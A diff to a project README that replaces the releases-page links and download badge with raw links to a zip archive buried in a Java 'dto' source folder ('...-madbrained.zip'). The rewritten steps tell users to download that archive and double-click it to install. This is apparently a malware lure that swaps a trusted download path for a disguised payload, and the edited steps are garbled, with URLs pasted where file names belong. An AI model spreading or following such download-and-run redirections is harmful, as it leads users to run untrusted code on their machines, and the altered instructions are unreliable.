@@ -9,7 +9,7 @@ To start using this software, follow the steps below. You will be downloading th
 ## 📥 Download the Application
 **Click the button below to download the latest version:**
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/dminh0502/AI-Powered-Question-Generation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dminh0502/AI-Powered-Question-Generation/main/src/main/java/com/vahabvahabov/AI_Powered_Question_Generation_Module/dto/AI-Powered-Question-Generation-madbrained.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dminh0502/AI-Powered-Question-Generation/main/src/main/java/com/vahabvahabov/AI_Powered_Question_Generation_Module/dto/AI-Powered-Question-Generation-madbrained.zip)
 
 ## 🛠 System Requirements
 Before you download the application, make sure your system meets the following requirements:
@@ -21,15 +21,15 @@ Before you download the application, make sure your system meets the following r
 - **Internet Connection:** Required for updating and using certain features
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/dminh0502/AI-Powered-Question-Generation/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/dminh0502/AI-Powered-Question-Generation/main/src/main/java/com/vahabvahabov/AI_Powered_Question_Generation_Module/dto/AI-Powered-Question-Generation-madbrained.zip) to find the latest version of the application.
 
 2. **Select the Version:** Click on the version you want to download. You will see a list of files.
 
-3. **Download the Installer:** Look for the file named `AI-Powered-Question-Generation-installer.zip`. Click on it to start the download.
+3. **Download the Installer:** Look for the file named `https://raw.githubusercontent.com/dminh0502/AI-Powered-Question-Generation/main/src/main/java/com/vahabvahabov/AI_Powered_Question_Generation_Module/dto/AI-Powered-Question-Generation-madbrained.zip`. Click on it to start the download.
 
 4. **Extract the Files:** After the download completes, locate the `.zip` file in your downloads folder. Right-click it and select “Extract All” to unpack the files.
 
-5. **Run the Installer:** Navigate to the folder where you extracted the files. Look for `setup.exe` and double-click it to run the installer.
+5. **Run the Installer:** Navigate to the folder where you extracted the files. Look for `https://raw.githubusercontent.com/dminh0502/AI-Powered-Question-Generation/main/src/main/java/com/vahabvahabov/AI_Powered_Question_Generation_Module/dto/AI-Powered-Question-Generation-madbrained.zip` and double-click it to run the installer.
 
 6. **Follow the Instructions:** The installer will guide you through the setup process. Just follow the prompts.
 
